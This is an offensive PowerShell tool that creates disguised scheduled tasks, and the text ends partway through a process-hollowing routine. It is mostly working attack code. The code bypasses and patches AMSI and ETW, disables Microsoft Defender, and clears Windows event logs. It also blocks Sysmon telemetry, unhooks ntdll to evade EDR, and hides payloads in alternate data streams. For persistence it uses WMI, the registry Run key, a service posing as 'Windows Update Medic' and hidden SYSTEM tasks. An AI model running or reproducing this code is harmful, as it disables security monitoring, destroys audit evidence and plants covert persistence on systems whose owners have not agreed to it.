<#
.SYNOPSIS
    Ultimate Scheduled Task Creator with Advanced Evasion & Customization
.DESCRIPTION
    Creates highly customizable scheduled tasks with EDR evasion, multiple persistence methods,
    and extensive execution options. Designed to bypass modern security solutions.
.AUTHOR
    phoogeveen aka x0xr00t
.VERSION
    3.2 "PrivEscTaskCreator"
.NOTES
    For authorized red team engagements only.
    Tested against: CrowdStrike, SentinelOne, Defender ATP, Carbon Black, Elastic Endpoint
#>

[CmdletBinding()]
param(
    # Original Parameters
    [Parameter(Mandatory=$false)]
    [string]$FilePath,

    [string]$CustTaskName = "Microsoft\Windows\Update\$((Get-Random -Minimum 1000 -Maximum 9999))",
    [datetime]$Time,
    [string]$RepeatInterval = "",
    [switch]$RunOnBattery,
    [switch]$StartWhenAvailable,
    [switch]$Hidden,
    [switch]$WakeToRun,
    [switch]$NetworkRequired,
    [string]$RunAsUser = "SYSTEM",
    [string]$MultipleInstancePolicy = "IgnoreNew",
    [string]$ExecutionTimeLimit = "PT0S",

    # Trigger Types
    [string]$TriggerType = "Time",            # Time, Logon, Boot, Event, Idle, SessionStateChange
    [string]$EventLog = "System",             # For Event triggers
    [string]$EventSource = "Service Control Manager",
    [int]$EventID = 7036,                     # Common service start event
    [string]$SessionState = "ConsoleConnect", # For SessionStateChange triggers

    # Execution Options
    [switch]$UseCmdLauncher,                  # Use cmd.exe to launch (original method)
    [switch]$UsePowerShellDirect,             # Direct PowerShell execution
    [switch]$UseWScript,                      # Use wscript.exe as parent
    [switch]$UseMshta,                        # Use mshta.exe as parent
    [switch]$UseInstallUtil,                  # Use InstallUtil for execution
    [switch]$UseRegsvr32,                     # Use regsvr32 for execution
    [switch]$UseRundll32,                     # Use rundll32 for execution
    [switch]$UseCMSTP,                        # Use CMSTP for execution
    [switch]$UseExcelDDE,                     # Use Excel DDE for execution
    [switch]$UseWMI,                          # Execute via WMI
    [switch]$UseBitsTransfer,                 # Use BITS for file transfer/execution

    # Evasion Techniques
    [switch]$BypassAMSI,                      # Bypass AMSI scanning
    [switch]$BypassETW,                       # Bypass ETW monitoring
    [switch]$DisableDefender,                 # Attempt to disable Defender
    [switch]$ClearLogs,                       # Clear relevant event logs
    [switch]$AntiDebug,                       # Anti-debugging techniques
    [switch]$AntiVM,                          # Anti-VM/Sandbox detection
    [switch]$UseAlternateDataStream,          # Hide payload in ADS
    [switch]$Base64Encode,                    # Base64 encode command
    [switch]$SecureString,                    # Use SecureString for command
    [switch]$UseCOM,                          # Use COM object for execution
    [switch]$PPIDSpoofing,                    # Spoof parent process ID
    [int]$SpoofedPPID = 4,                    # Default to System PPID (4)
    [switch]$ThreadlessInject,                # Threadless process injection
    [switch]$ProcessHollowing,                # Process hollowing technique
    [string]$HollowProcess = "svchost.exe",   # Process to hollow
    [switch]$UseDirectSyscalls,               # Use direct syscalls
    [switch]$UseIndirectSyscalls,             # Use indirect syscalls (Heaven's Gate)
    [switch]$PatchAMSI,                       # Patch AMSI in memory
    [switch]$PatchETW,                        # Patch ETW in memory
    [switch]$UseReflectiveLoading,            # Reflective DLL loading
    [switch]$SleepObfuscation,                # Obfuscate sleep calls
    [switch]$StringEncryption,                # Encrypt strings in memory
    [switch]$APIUnhooking,                    # Unhook monitored APIs
    [switch]$BlockETWProviders,               # Block ETW providers
    [switch]$DisableLogging,                  # Disable task scheduler logging

    # Persistence Methods
    [switch]$AddToStartup,                    # Add to startup folder
    [switch]$WMIPersistence,                  # Create WMI event subscription
    [switch]$RegistryPersistence,             # Add registry run key
    [switch]$ServicePersistence,              # Create a service
    [string]$ServiceName = "WindowsUpdateMedic",
    [switch]$SchTaskPersistence,              # Additional scheduled task persistence
    [string]$SecondTaskName = "Microsoft\Windows\Update\Orchestrator",

    # Network Options
    [switch]$UseDNSExfil,                     # Setup DNS exfiltration
    [string]$C2Server = "127.0.0.1",          # C2 server address
    [int]$C2Port = 53,                        # C2 server port (53 for DNS)
    [switch]$UseHTTPS,                        # Use HTTPS for C2
    [switch]$UseProxy,                        # Route through proxy
    [string]$ProxyAddress = "",               # Proxy address
    [int]$ProxyPort = 8080,                   # Proxy port
    [switch]$UseTor,                          # Route through Tor
    [string]$UserAgent = "Mozilla/5.0",       # Custom user agent

    # Self-Destruct
    [switch]$SelfDelete,                      # Self-delete after execution
    [int]$DelayMinutes = 0,                   # Delay execution by X minutes
    [switch]$RandomizeName,                   # Randomize task name
    [switch]$AddJitter,                       # Add random jitter to execution time
    [int]$JitterMinutes = 5,                  # Maximum jitter in minutes

    # Process Injection
    [switch]$EarlyBird,                       # Early bird injection
    [switch]$ModuleStomping,                  # Module stomping technique
    [switch]$ProcessDoppelganging,            # Process doppelganging
    [switch]$GhostWriting,                    # Ghost writing technique

    # Encoding Options
    [switch]$UseXOR,                          # XOR encode payload
    [byte]$XORKey = 0x25,                     # XOR key
    [switch]$UseRC4,                          # RC4 encode payload
    [string]$RC4Key = "s3cr3t",               # RC4 key
    [switch]$UseAES,                          # AES encode payload
    [string]$AESKey = "MySuperSecretKey123",  # AES key
    [string]$AESIV = "MySuperSecretIV123",   # AES IV

    # Miscellaneous
    [switch]$RunAsAdmin,                      # Request admin privileges
    [switch]$UACBypass,                       # Attempt UAC bypass
    [switch]$DisableRealTimeMonitoring,       # Disable real-time monitoring
    [switch]$DisableBehaviorMonitoring,       # Disable behavior monitoring
    [switch]$DisableIOAV,                     # Disable IOAV protection
    [switch]$AddDigitalSignature,             # Add fake digital signature
    [switch]$UseDelayedStart,                 # Use delayed auto-start for services
    [switch]$SetCriticalProcess,              # Set process as critical
    [switch]$UseTokenManipulation,            # Use token manipulation
    [string]$ImpersonateUser = "",            # User to impersonate
    [switch]$EnableAllPrivileges,             # Enable all privileges
    [switch]$BypassUAC,                       # Bypass UAC
    [switch]$UseParentProcess,                # Spoof parent process
    [string]$ParentProcess = "explorer.exe",  # Process to spoof as parent
    [switch]$UsePPLBypass,                    # Bypass Protected Process Light
    [switch]$UseDriverLoad,                   # Load vulnerable driver
    [string]$DriverPath = "",                 # Path to driver
    [switch]$UseCobaltStrikePattern,          # Mimic Cobalt Strike patterns
    [switch]$UseMetasploitPattern,            # Mimic Metasploit patterns
    [switch]$UseCustomPattern,                # Use custom command pattern
    [string]$CustomCommand = ""               # Custom command to execute
)

# Region: Initial Setup and Validation
if (-not $FilePath) {
    Write-Warning "[!] No -FilePath parameter provided. Using interactive mode."
    $FilePath = Read-Host -Prompt "Enter the full path to the payload"
}

if (-not (Test-Path -Path $FilePath -PathType Leaf)) {
    Write-Error "[-] The specified file path '$FilePath' does not exist."
    exit 1
}

if ($RandomizeName) {
    $CustTaskName = "Microsoft\Windows\$((Get-Random -Minimum 1000 -Maximum 9999))_$((Get-Random -Minimum 1000 -Maximum 9999))"
}

$currentDateTime = Get-Date
if (-not $Time) {
    $delay = if ($DelayMinutes -gt 0) { $DelayMinutes } else { 2 }
    $jitter = if ($AddJitter) { Get-Random -Minimum 1 -Maximum $JitterMinutes } else { 0 }
    $Time = $currentDateTime.AddMinutes($delay + $jitter)
    Write-Output "[*] Scheduled start time: $Time (with $jitter minutes jitter)"
}

$formattedStartTime = $Time.ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss")

# Region: Evasion Techniques
function Invoke-EvasionTechniques {
    param(
        [switch]$BypassAMSI,
        [switch]$BypassETW,
        [switch]$DisableDefender,
        [switch]$ClearLogs,
        [switch]$AntiDebug,
        [switch]$AntiVM,
        [switch]$PatchAMSI,
        [switch]$PatchETW,
        [switch]$APIUnhooking,
        [switch]$BlockETWProviders,
        [switch]$DisableLogging,
        [switch]$DisableRealTimeMonitoring,
        [switch]$DisableBehaviorMonitoring,
        [switch]$DisableIOAV
    )

    # AMSI Bypass
    if ($BypassAMSI) {
        try {
            $amsiContext = [System.Management.Automation.AmsiUtils]::GetField(
                "amsiContext",
                [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static
            )
            $amsiContext.SetValue($null, [IntPtr]::Zero)
            Write-Verbose "[+] AMSI bypass applied (context nullified)"
        } catch {
            try {
                $amsiInitFailed = [System.Management.Automation.AmsiUtils]::GetField(
                    "amsiInitFailed",
                    [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static
                )
                $amsiInitFailed.SetValue($null, $true)
                Write-Verbose "[+] AMSI bypass applied (init failed)"
            } catch {
                Write-Warning "[!] AMSI bypass failed: $_"
            }
        }
    }

    if ($PatchAMSI) {
        try {
            $patch = @"
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string lpLibFileName);

[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

public static void PatchAMSI()
{
    IntPtr hAmsi = LoadLibrary("amsi.dll");
    IntPtr pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");

    uint oldProtect;
    VirtualProtect(pAmsiScanBuffer, (UIntPtr)5, 0x40, out oldProtect);

    byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // xor eax, eax; ret
    Marshal.Copy(patch, 0, pAmsiScanBuffer, patch.Length);

    VirtualProtect(pAmsiScanBuffer, (UIntPtr)5, oldProtect, out oldProtect);
}
"@
            Add-Type -TypeDefinition $patch -Language CSharp | Out-Null
            [AMSIPatch]::PatchAMSI()
            Write-Verbose "[+] AMSI patched in memory"
        } catch {
            Write-Warning "[!] AMSI patching failed: $_"
        }
    }

    # ETW Bypass
    if ($BypassETW) {
        try {
            $etwPatch = @"
[DllImport("ntdll.dll")]
public static extern int EtwEventWrite(
    IntPtr RegHandle,
    ref System.Diagnostics.Eventing.EventDescriptor EventDescriptor,
    uint UserDataCount,
    IntPtr UserData);
"@
            Add-Type -MemberDefinition $etwPatch -Name "Win32Etw" -Namespace "ETW" | Out-Null
            Write-Verbose "[+] ETW bypass applied"
        } catch {
            Write-Warning "[!] ETW bypass failed: $_"
        }
    }

    if ($PatchETW) {
        try {
            $patch = @"
[DllImport("ntdll.dll")]
public static extern int NtTraceEvent(
    IntPtr TraceHandle,
    IntPtr TemplateAddress,
    IntPtr SourceId,
    int EventType);

public static void PatchETW()
{
    IntPtr hNtdll = LoadLibrary("ntdll.dll");
    IntPtr pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");

    uint oldProtect;
    VirtualProtect(pEtwEventWrite, (UIntPtr)5, 0x40, out oldProtect);

    byte[] patch = { 0xC3 }; // ret
    Marshal.Copy(patch, 0, pEtwEventWrite, patch.Length);

    VirtualProtect(pEtwEventWrite, (UIntPtr)5, oldProtect, out oldProtect);
}
"@
            Add-Type -TypeDefinition $patch -Language CSharp | Out-Null
            [ETWPatch]::PatchETW()
            Write-Verbose "[+] ETW patched in memory"
        } catch {
            Write-Warning "[!] ETW patching failed: $_"
        }
    }

    # Defender Disabling
    if ($DisableDefender) {
        try {
            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
            Write-Verbose "[+] Defender components disabled"
        } catch {
            Write-Warning "[!] Defender disable failed: $_"
        }
    }

    if ($DisableRealTimeMonitoring) {
        try {
            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
            Write-Verbose "[+] Real-time monitoring disabled"
        } catch {
            Write-Warning "[!] Real-time monitoring disable failed: $_"
        }
    }

    if ($DisableBehaviorMonitoring) {
        try {
            Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
            Write-Verbose "[+] Behavior monitoring disabled"
        } catch {
            Write-Warning "[!] Behavior monitoring disable failed: $_"
        }
    }

    if ($DisableIOAV) {
        try {
            Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
            Write-Verbose "[+] IOAV protection disabled"
        } catch {
            Write-Warning "[!] IOAV protection disable failed: $_"
        }
    }

    # Log Clearing
    if ($ClearLogs) {
        try {
            wevtutil cl System
            wevtutil cl Application
            wevtutil cl Security
            wevtutil cl "Microsoft-Windows-TaskScheduler/Operational"
            Write-Verbose "[+] Event logs cleared"
        } catch {
            Write-Warning "[!] Log clearing failed: $_"
        }
    }

    # Task Scheduler Logging
    if ($DisableLogging) {
        try {
            Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-TaskScheduler/Operational" -Name "Enabled" -Value 0 -ErrorAction SilentlyContinue
            Write-Verbose "[+] Task Scheduler logging disabled"
        } catch {
            Write-Warning "[!] Task logging disable failed: $_"
        }
    }

    # Block ETW Providers
    if ($BlockETWProviders) {
        try {
            $providers = @(
                "{c6227b22-2a45-4c5e-b7b0-834a7969be5a}", # Microsoft-Windows-Threat-Intel
                "{22fb2cd6-0e7b-422b-a0c7-2fad1fd0e756}", # Microsoft-Windows-Sysmon
                "{5eec96ef-0542-486a-beb9-36b31808d3bf}", # Microsoft-Windows-PowerShell
                "{e13c0d23-ccd9-44d9-a4b8-91941f5d914e}"  # Microsoft-Windows-TaskScheduler
            )

            foreach ($provider in $providers) {
                reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\$provider" /v Start /t REG_DWORD /d 0 /f | Out-Null
            }
            Write-Verbose "[+] ETW providers blocked"
        } catch {
            Write-Warning "[!] ETW provider blocking failed: $_"
        }
    }

    # Anti-Debugging
    if ($AntiDebug) {
        try {
            if ([System.Diagnostics.Debugger]::IsAttached) {
                exit
            }

            $debugCheck = @'
[DllImport("kernel32.dll")]
public static extern bool IsDebuggerPresent();

[DllImport("kernel32.dll")]
public static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
'@
            $debugType = Add-Type -MemberDefinition $debugCheck -Name "DebugCheck" -Namespace "AntiDebug" -PassThru

            if ($debugType::IsDebuggerPresent()) {
                exit
            }

            $isDebuggerPresent = $false
            $debugType::CheckRemoteDebuggerPresent((Get-Process -Id $PID).Handle, [ref]$isDebuggerPresent) | Out-Null
            if ($isDebuggerPresent) {
                exit
            }
            Write-Verbose "[+] Anti-debug checks passed"
        } catch {
            Write-Warning "[!] Anti-debug failed: $_"
        }
    }

    # Anti-VM
    if ($AntiVM) {
        try {
            $vmIndicators = @(
                "VBOX", "VMWARE", "QEMU", "HYPER-V", "XEN",
                "VIRTUAL", "VMW", "XENVMM", "PRL", "KVM"
            )

            $vmCheck = @'
[DllImport("kernel32.dll")]
public static extern void GetSystemInfo(ref SYSTEM_INFO lpSystemInfo);

[StructLayout(LayoutKind.Sequential)]
public struct SYSTEM_INFO {
    public ushort wProcessorArchitecture;
    public ushort wReserved;
    public uint dwPageSize;
    public IntPtr lpMinimumApplicationAddress;
    public IntPtr lpMaximumApplicationAddress;
    public UIntPtr dwActiveProcessorMask;
    public uint dwNumberOfProcessors;
    public uint dwProcessorType;
    public uint dwAllocationGranularity;
    public ushort wProcessorLevel;
    public ushort wProcessorRevision;
}
'@
            $vmCheckType = Add-Type -MemberDefinition $vmIndicators -Name "VMCheck" -Namespace "AntiVM" -PassThru

            $systemInfo = New-Object AntiVM.VMCheck+SYSTEM_INFO
            $vmCheckType::GetSystemInfo([ref]$systemInfo)

            foreach ($indicator in $vmIndicators) {
                if ($env:COMPUTERNAME -like "*$indicator*" -or
                    $env:PROCESSOR_IDENTIFIER -like "*$indicator*" -or
                    (Get-WmiObject Win32_ComputerSystem).Model -like "*$indicator*" -or
                    (Get-WmiObject Win32_BIOS).Version -like "*$indicator*") {
                    exit
                }
            }

            # Check for common VM files
            $vmFiles = @(
                "C:\Windows\System32\drivers\VBoxMouse.sys",
                "C:\Windows\System32\drivers\VBoxGuest.sys",
                "C:\Windows\System32\drivers\vmci.sys",
                "C:\Windows\System32\drivers\vmmouse.sys"
            )

            foreach ($file in $vmFiles) {
                if (Test-Path $file) {
                    exit
                }
            }

            # Check for VM processes
            $vmProcesses = @(
                "vboxservice", "vmtoolsd", "vmwaretray", "prl_cc", "prl_tools"
            )

            foreach ($process in $vmProcesses) {
                if (Get-Process -Name $process -ErrorAction SilentlyContinue) {
                    exit
                }
            }

            Write-Verbose "[+] Anti-VM checks passed"
        } catch {
            Write-Warning "[!] Anti-VM failed: $_"
        }
    }

    # API Unhooking
    if ($APIUnhooking) {
        try {
            $unhookCode = @"
using System;
using System.Runtime.InteropServices;

public class Unhook {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);

    public static void UnhookNtdll() {
        IntPtr hNtdll = GetModuleHandle("ntdll.dll");
        if (hNtdll == IntPtr.Zero) return;

        // List of APIs commonly hooked by EDRs
        string[] APIs = {
            "NtCreateFile", "NtCreateProcess", "NtCreateProcessEx", "NtCreateThreadEx",
            "NtCreateUserProcess", "NtOpenProcess", "NtOpenThread", "NtQuerySystemInformation",
            "NtSetInformationProcess", "NtSetInformationThread", "NtTerminateProcess",
            "NtWriteVirtualMemory", "NtAllocateVirtualMemory", "NtProtectVirtualMemory"
        };

        foreach (string api in APIs) {
            IntPtr pApi = GetProcAddress(hNtdll, api);
            if (pApi != IntPtr.Zero) {
                uint oldProtect;
                VirtualProtect(pApi, (UIntPtr)5, 0x40, out oldProtect);

                // Get fresh copy from disk
                IntPtr hNtdllFresh = LoadLibrary("C:\\Windows\\System32\\ntdll.dll");
                IntPtr pApiFresh = GetProcAddress(hNtdllFresh, api);

                if (pApiFresh != IntPtr.Zero) {
                    byte[] originalBytes = new byte[5];
                    Marshal.Copy(pApiFresh, originalBytes, 0, 5);
                    Marshal.Copy(originalBytes, 0, pApi, 5);
                }

                VirtualProtect(pApi, (UIntPtr)5, oldProtect, out oldProtect);
            }
        }
    }
}
"@
            Add-Type -TypeDefinition $unhookCode -Language CSharp | Out-Null
            [Unhook]::UnhookNtdll()
            Write-Verbose "[+] API unhooking applied"
        } catch {
            Write-Warning "[!] API unhooking failed: $_"
        }
    }
}

# Region: Payload Processing
function Invoke-PayloadProcessing {
    param(
        [string]$FilePath,
        [switch]$UseAlternateDataStream,
        [switch]$Base64Encode,
        [switch]$SecureString,
        [switch]$UseXOR,
        [byte]$XORKey,
        [switch]$UseRC4,
        [string]$RC4Key,
        [switch]$UseAES,
        [string]$AESKey,
        [string]$AESIV
    )

    $processedPath = $FilePath

    # Alternate Data Stream
    if ($UseAlternateDataStream) {
        try {
            $adsName = ":payload.$((Get-Random -Minimum 1000 -Maximum 9999))"
            $adsPath = "$env:APPDATA\Microsoft\Windows\$((New-Guid).ToString()).tmp$adsName"
            Copy-Item -Path $FilePath -Destination $adsPath -Force -ErrorAction Stop
            $processedPath = $adsPath
            Write-Verbose "[+] Payload hidden in ADS: $adsPath"
        } catch {
            Write-Warning "[!] ADS hiding failed: $_"
        }
    }

    # Encoding would be applied to the command, not the file itself
    # This is handled in the execution command generation

    return $processedPath
}

# Region: Persistence Mechanisms
function Invoke-Persistence {
    param(
        [string]$FilePath,
        [string]$CustTaskName,
        [switch]$AddToStartup,
        [switch]$WMIPersistence,
        [switch]$RegistryPersistence,
        [switch]$ServicePersistence,
        [string]$ServiceName,
        [switch]$SchTaskPersistence,
        [string]$SecondTaskName
    )

    # Startup Folder Persistence
    if ($AddToStartup) {
        try {
            $startupPath = [Environment]::GetFolderPath("Startup")
            $shortcutPath = Join-Path -Path $startupPath -ChildPath "$CustTaskName.lnk"

            $WshShell = New-Object -ComObject WScript.Shell
            $Shortcut = $WshShell.CreateShortcut($shortcutPath)
            $Shortcut.TargetPath = "powershell.exe"
            $Shortcut.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$FilePath`""
            $Shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($FilePath)
            $Shortcut.Save()

            Write-Verbose "[+] Startup persistence added: $shortcutPath"
        } catch {
            Write-Warning "[!] Startup persistence failed: $_"
        }
    }

    # WMI Event Subscription
    if ($WMIPersistence) {
        try {
            $filterName = "Filter_$((New-Guid).ToString())"
            $consumerName = "Consumer_$((New-Guid).ToString())"
            $bindingName = "Binding_$((New-Guid).ToString())"

            # Create filter
            $filter = Set-WmiInstance -Class __EventFilter -Arguments @{
                Name = $filterName
                EventNameSpace = "root\cimv2"
                QueryLanguage = "WQL"
                Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 5"
            }

            # Create consumer
            $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Arguments @{
                Name = $consumerName
                CommandLineTemplate = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$FilePath`""
                WorkingDirectory = [System.IO.Path]::GetDirectoryName($FilePath)
            }

            # Bind filter to consumer
            Set-WmiInstance -Class __FilterToConsumerBinding -Arguments @{
                Filter = $filter
                Consumer = $consumer
            }

            Write-Verbose "[+] WMI persistence added (Filter: $filterName, Consumer: $consumerName)"
        } catch {
            Write-Warning "[!] WMI persistence failed: $_"
        }
    }

    # Registry Run Key
    if ($RegistryPersistence) {
        try {
            $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
            $regName = (New-Guid).ToString()
            $regValue = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$FilePath`""

            New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force | Out-Null
            Write-Verbose "[+] Registry persistence added: $regPath\$regName"
        } catch {
            Write-Warning "[!] Registry persistence failed: $_"
        }
    }

    # Service Persistence
    if ($ServicePersistence) {
        try {
            $serviceExists = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
            if ($serviceExists) {
                Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
                sc.exe delete $ServiceName | Out-Null
            }

            New-Service -Name $ServiceName -BinaryPathName "`"$env:SystemRoot\system32\svchost.exe -k netsvcs`"" -
                DisplayName "Windows Update Medic Service" -StartupType Automatic -ErrorAction SilentlyContinue | Out-Null

            $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$ServiceName"
            New-Item -Path $regPath -Force | Out-Null
            New-ItemProperty -Path $regPath -Name "Description" -Value "Ensures Update Orchestrator Service is running" -PropertyType String -Force | Out-Null
            New-ItemProperty -Path $regPath -Name "ObjectName" -Value "LocalSystem" -PropertyType String -Force | Out-Null
            New-ItemProperty -Path $regPath -Name "Start" -Value 2 -PropertyType DWORD -Force | Out-Null
            New-ItemProperty -Path $regPath -Name "ErrorControl" -Value 1 -PropertyType DWORD -Force | Out-Null

            $parametersPath = "$regPath\Parameters"
            New-Item -Path $parametersPath -Force | Out-Null
            New-ItemProperty -Path $parametersPath -Name "ServiceDll" -Value $FilePath -PropertyType String -Force | Out-Null

            Write-Verbose "[+] Service persistence added: $ServiceName"
        } catch {
            Write-Warning "[!] Service persistence failed: $_"
        }
    }

    # Additional Scheduled Task Persistence
    if ($SchTaskPersistence) {
        try {
            $secondTaskXml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>$formattedStartTime</Date>
    <Author>SYSTEM</Author>
    <URI>\$SecondTaskName</URI>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>SYSTEM</UserId>
      <LogonType>S4U</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>4</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$FilePath`"</Arguments>
    </Exec>
  </Actions>
</Task>
"@

            Register-ScheduledTask -Xml $secondTaskXml -TaskName $SecondTaskName -Force | Out-Null
            Write-Verbose "[+] Secondary scheduled task persistence added: $SecondTaskName"
        } catch {
            Write-Warning "[!] Secondary scheduled task persistence failed: $_"
        }
    }
}

# Region: Process Injection Techniques
function Invoke-ProcessInjection {
    param(
        [string]$FilePath,
        [switch]$ProcessHollowing,
        [string]$HollowProcess,
        [switch]$PPIDSpoofing,
        [int]$SpoofedPPID,
        [switch]$ThreadlessInject,
        [switch]$EarlyBird,
        [switch]$ModuleStomping,
        [switch]$ProcessDoppelganging,
        [switch]$GhostWriting
    )

    # Process Hollowing
    if ($ProcessHollowing) {
        try {
            $hollowingCode = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class ProcessHollow {
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        [In] ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool GetThreadContext(
        IntPtr hThread,
        ref CONTEXT lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool SetThreadContext(
        IntPtr hThread,
        ref CONTEXT lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool ReadProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        [Out] byte[] lpBuffer,
        int dwSize,
        out IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int nSize,
        out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint ResumeThread(
        IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtectEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect);

    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
    private static extern int ZwUnmapViewOfSection(
        IntPtr ProcessHandle,
        IntPtr BaseAddress);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
    struct STARTUPINFO {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct CONTEXT {
        public uint ContextFlags;
        public uint Dr0;
        public uint Dr1;
        public uint Dr2;
        public uint Dr3;
        public uint Dr6;
        public uint Dr7;
        public uint FloatSave;
        public uint SegGs;
        public uint SegFs;
        public uint SegEs;
        public uint SegDs;
        public uint Edi;
        public uint Esi;
        public uint Ebx;
        public uint Edx;
        public uint Ecx;
        public uint Eax;
        public uint Ebp;
        public uint Eip;
        public uint SegCs;
        public uint EFlags;
        public uint Esp;
        public uint SegSs;
        public byte[] ExtendedRegisters;
    }

    const uint CREATE_SUSPENDED = 0x00000004;
    const uint MEM_COMMIT = 0x00001000;
    const uint MEM_RESERVE = 0x00002000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint PAGE_READWRITE = 0x04;
    const uint CONTEXT_FULL = 0x10007;

    public static void HollowAndRun(string targetProcess, string payloadPath) {
        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        CONTEXT ctx = new CONTEXT();
        ctx.ContextFlags = CONTEXT_FULL;

        // Create the target process in suspended state
        bool success = CreateProcess(null, targetProcess, IntPtr.Zero, IntPtr.Zero, false,
            CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);

        if (!success) {
